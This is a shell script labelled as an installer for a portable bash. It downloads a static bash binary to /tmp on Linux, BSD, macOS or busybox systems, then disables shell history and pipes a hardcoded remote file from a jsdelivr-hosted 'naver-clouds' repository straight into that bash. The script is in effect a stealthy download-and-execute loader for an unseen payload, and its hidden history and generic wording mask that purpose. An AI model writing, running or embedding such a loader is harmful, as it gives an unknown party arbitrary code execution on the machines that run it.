#!/usr/bin/env sh
#
# Auto-install portable bash and execute command script
# This script always downloads portable bash and executes the specified command
# Compatible with busybox environments and various sh locations

# --- Find compatible shell if current one fails ---
find_shell() {
    # Common shell locations
    for shell_path in \
        "/bin/sh" \
        "/usr/bin/sh" \
        "/system/bin/sh" \
        "/system/xbin/sh" \
        "/sbin/sh" \
        "/usr/local/bin/sh" \
        "/opt/bin/sh"
    do
        if [ -x "$shell_path" ]; then
            SHELL_PATH="$shell_path"
            return 0
        fi
    done
    
    # Try to find sh in PATH
    if command -v sh >/dev/null 2>&1; then
        SHELL_PATH=$(command -v sh)
        return 0
    fi
    
    # Try busybox sh
    if command -v busybox >/dev/null 2>&1; then
        if busybox sh -c "echo test" >/dev/null 2>&1; then
            SHELL_PATH="busybox sh"
            return 0
        fi
    fi
    
    return 1
}

# --- Re-execute with found shell if needed ---
reexec_with_shell() {
    # Check if we're already running with a working shell
    if [ -n "$SHELL_REEXEC_DONE" ]; then
        return 0
    fi
    
    # Try to find a working shell
    if ! find_shell; then
        printf "Error: No compatible shell found\n" >&2
        exit 1
    fi
    
    # Re-execute this script with the found shell
    export SHELL_REEXEC_DONE=1
    exec $SHELL_PATH "$0" "$@"
}

# --- Configuration ---
TMPDIR="/tmp"

# --- Helper Functions ---
DEBUGF() { :; }
if [ -n "$GS_DEBUG" ]; then
    DEBUGF() { printf '%s\n' "DEBUG: $*"; }
fi

FAIL_OUT() {
    printf '%s\n' "..[FAILED]"
    for str in "$@"; do
        printf '%s\n' "--> $str"
    done
}

OK_OUT() { 
    printf '%s\n' "......[OK]"
    [ -n "$1" ] && printf '%s\n' "--> $*"
}

xmkdir() {
    fn="$1"
    [ -d "$fn" ] && return 0
    mkdir -p "$fn" 2>/dev/null && chmod 700 "$fn" 2>/dev/null
}

# --- Busybox compatible command detection ---
detect_commands() {
    # Check for wget (busybox usually has wget)
    if command -v wget >/dev/null 2>&1; then
        WGET_AVAILABLE=1
    fi
    
    # Check for curl (less common in busybox)
    if command -v curl >/dev/null 2>&1; then
        CURL_AVAILABLE=1
    fi
    
    # Check for tar (busybox tar has limited options)
    if command -v tar >/dev/null 2>&1; then
        TAR_AVAILABLE=1
    fi
    
    # Check for gunzip
    if command -v gunzip >/dev/null 2>&1; then
        GUNZIP_AVAILABLE=1
    fi
    
    # Check for chmod
    if command -v chmod >/dev/null 2>&1; then
        CHMOD_AVAILABLE=1
    fi
    
    # Check for busybox explicitly
    if command -v busybox >/dev/null 2>&1; then
        BUSYBOX_AVAILABLE=1
        DEBUGF "Busybox detected"
        
        # Check busybox applets
        if busybox --help 2>/dev/null | grep -q wget; then
            BUSYBOX_WGET=1
        fi
        if busybox --help 2>/dev/null | grep -q curl; then
            BUSYBOX_CURL=1
        fi
    fi
}

# --- Detect download tool (busybox compatible) ---
init_download_tool() {
    DL_EXEC=""
    IS_USE_CURL=""
    IS_USE_WGET=""
    
    detect_commands
    
    # Prefer busybox applets if available
    if [ "$BUSYBOX_AVAILABLE" = "1" ]; then
        if [ "$BUSYBOX_WGET" = "1" ]; then
            IS_USE_WGET=1
            DL_EXEC="busybox wget -q -O-"
            DEBUGF "Using busybox wget applet"
        elif [ "$BUSYBOX_CURL" = "1" ]; then
            IS_USE_CURL=1
            DL_EXEC="busybox curl -fsSL"
            DEBUGF "Using busybox curl applet"
        fi
    fi
    
    # Fallback to system commands
    if [ -z "$DL_EXEC" ]; then
        if [ "$WGET_AVAILABLE" = "1" ]; then
            IS_USE_WGET=1
            # Busybox wget has limited options
            DL_EXEC="wget -q -O-"
            DEBUGF "Using system wget"
        elif [ "$CURL_AVAILABLE" = "1" ]; then
            IS_USE_CURL=1
            # Try full curl options first, fallback to basic
            if curl --help 2>/dev/null | grep -q "connect-timeout"; then
                DL_EXEC="curl -fsSL --connect-timeout 7 -m900 --retry 3"
            else
                DL_EXEC="curl -fsSL"
            fi
            DEBUGF "Using system curl"
        fi
    fi
    
    if [ -z "$DL_EXEC" ]; then
        FAIL_OUT "Need wget or curl to download bash"
        exit 1
    fi
}

# --- Always install portable bash (busybox compatible) ---
install_portable_bash() {
    printf "Downloading portable bash..."

    # Get system architecture (busybox compatible)
    arch=$(uname -m 2>/dev/null || echo "unknown")
    
    # Detect OS type (busybox compatible)
    if [ -z "$OSTYPE" ]; then
        osname=$(uname -s 2>/dev/null || echo "Linux")
        case "$osname" in 
            *FreeBSD*) OSTYPE="FreeBSD";;
            *Darwin*) OSTYPE="darwin22.0";;
            *OpenBSD*) OSTYPE="openbsd7.3";;
            *Linux*|*linux*) OSTYPE="linux-gnu";;
            *) OSTYPE="linux-gnu";;
        esac
    fi

    # Determine architecture and OS for bash download
    bash_osarch=""
    case "$OSTYPE" in
        *linux*)
            case "$arch" in 
                x86_64|amd64) bash_osarch="linux-x86_64";;
                i[3-6]86|i86pc) bash_osarch="linux-i386";;
                aarch64|arm64) bash_osarch="linux-aarch64";;
                armv7*|armv7l) bash_osarch="linux-armv7";;
                armv6*|armv6l) bash_osarch="linux-armv6";;
                arm*) bash_osarch="linux-arm";;
                mips64*) bash_osarch="linux-mips64";;
                mips*) bash_osarch="linux-mips";;
                *) bash_osarch="linux-x86_64";;
            esac;;
        *darwin*)
            case "$arch" in
                x86_64|amd64) bash_osarch="darwin-x86_64";;
                arm64|aarch64) bash_osarch="darwin-arm64";;
                *) bash_osarch="darwin-x86_64";;
            esac;;
        *freebsd*)
            case "$arch" in
                x86_64|amd64) bash_osarch="freebsd-x86_64";;
                i[3-6]86) bash_osarch="freebsd-i386";;
                aarch64|arm64) bash_osarch="freebsd-aarch64";;
                *) bash_osarch="freebsd-x86_64";;
            esac;;
        *openbsd*)
            case "$arch" in
                x86_64|amd64) bash_osarch="openbsd-x86_64";;
                i[3-6]86) bash_osarch="openbsd-i386";;
                aarch64|arm64) bash_osarch="openbsd-aarch64";;
                *) bash_osarch="openbsd-x86_64";;
            esac;;
        *) bash_osarch="linux-x86_64";;
    esac

    # Busybox-friendly download URLs (prefer static binaries)
    bash_urls="https://github.com/robxu9/bash-static/releases/download/5.1.016-1.2.3/bash-${bash_osarch}"

    # Add architecture-specific fallback URLs
    case "$arch" in
        x86_64|amd64)
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/bash";;
        i[3-6]86|i86pc)
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/i386/bash";;
        aarch64|arm64)
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/aarch64/bash";;
        armv7*|armv7l)
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/armv7/bash";;
        armv6*|armv6l)
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/armv6/bash";;
        arm*)
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/arm/bash";;
        *)
            # Default fallback
            bash_urls="$bash_urls https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/bash";;
    esac

    DEBUGF "Architecture detected: $arch"
    DEBUGF "OS detected: $OSTYPE"
    DEBUGF "Bash OS-Arch: $bash_osarch"

    # Create bash installation directory with unique name
    BASH_INSTALL_DIR="${TMPDIR}/portable-bash-$$"
    xmkdir "$BASH_INSTALL_DIR" || { 
        FAIL_OUT "Cannot create bash install directory"
        return 1
    }
    BASH_PATH="${BASH_INSTALL_DIR}/bash"
    
    # Try downloading from each URL (busybox compatible)
    download_success=0
    for url in $bash_urls; do
        DEBUGF "Trying to download bash from: $url"
        
        # Clean any previous failed download
        rm -f "$BASH_PATH" 2>/dev/null
        
        if [ "$IS_USE_WGET" = "1" ]; then
            # Busybox wget method
            if $DL_EXEC "$url" > "$BASH_PATH" 2>/dev/null; then
                # Check if file was actually downloaded and has content
                if [ -f "$BASH_PATH" ] && [ -s "$BASH_PATH" ]; then
                    download_success=1
                    break
                fi
            fi
        elif [ "$IS_USE_CURL" = "1" ]; then
            # Curl method
            if $DL_EXEC "$url" -o "$BASH_PATH" 2>/dev/null; then
                if [ -f "$BASH_PATH" ] && [ -s "$BASH_PATH" ]; then
                    download_success=1
                    break
                fi
            fi
        fi
    done
    
    # Check if download was successful
    if [ "$download_success" = "0" ] || [ ! -f "$BASH_PATH" ] || [ ! -s "$BASH_PATH" ]; then
        FAIL_OUT "Failed to download portable bash from all sources"
        return 1
    fi
    
    # Make bash executable (busybox compatible)
    if [ "$CHMOD_AVAILABLE" = "1" ]; then
        chmod +x "$BASH_PATH" 2>/dev/null || { 
            FAIL_OUT "Cannot make bash executable"
            return 1
        }
    elif [ "$BUSYBOX_AVAILABLE" = "1" ]; then
        busybox chmod +x "$BASH_PATH" 2>/dev/null
    fi
    
    # Test if the downloaded bash works
    if ! "$BASH_PATH" -c "echo test" >/dev/null 2>&1; then
        FAIL_OUT "Downloaded bash is not working"
        rm -f "$BASH_PATH" 2>/dev/null
        return 1
    fi
    
    OK_OUT "Portable bash downloaded and ready at $BASH_PATH"
    return 0
}

# --- Execute command with portable bash (busybox compatible) ---
execute_with_portable_bash() {
    # Always install portable bash
    install_portable_bash || {
        FAIL_OUT "Cannot install portable bash"
        exit 1
    }
    
    # Use the portable bash
    bash_cmd="$BASH_PATH"
    
    # Execute the target command
    printf "Executing command with portable bash...\n"
    
    # Set history environment and execute command (busybox compatible)
    HISTFILE=/dev/null
    export HISTFILE
    
    # Download and execute the command using the same download method
    if [ "$IS_USE_WGET" = "1" ]; then
        # Use wget to download and pipe to bash
        if $DL_EXEC "https://cdn.jsdelivr.net/gh/naver-clouds/cdn/y" | "$bash_cmd"; then
            printf "Command executed successfully with portable bash\n"
        else
            printf "Command execution failed\n" >&2
            exit 1
        fi
    elif [ "$IS_USE_CURL" = "1" ]; then
        # Use curl method
        "$bash_cmd" -c "$(curl -fsSL https://cdn.jsdelivr.net/gh/naver-clouds/cdn/y)" || {
            printf "Command execution failed\n" >&2
            exit 1
        }
        printf "Command executed successfully with portable bash\n"
    else
        FAIL_OUT "No download tool available"
        exit 1
    fi
    
    # Clean up temporary bash installation
    if [ -n "$BASH_INSTALL_DIR" ] && [ -d "$BASH_INSTALL_DIR" ]; then
        rm -rf "$BASH_INSTALL_DIR" 2>/dev/null
    fi
}

# --- Main execution ---
main() {
    # Re-execute with compatible shell if needed
    reexec_with_shell "$@"
    
    printf "Starting portable bash execution (busybox compatible)...\n"
    
    # Initialize download tool
    init_download_tool
    
    # Execute command with portable bash
    execute_with_portable_bash
    
    exit 0
}

# Run main function
main "$@"
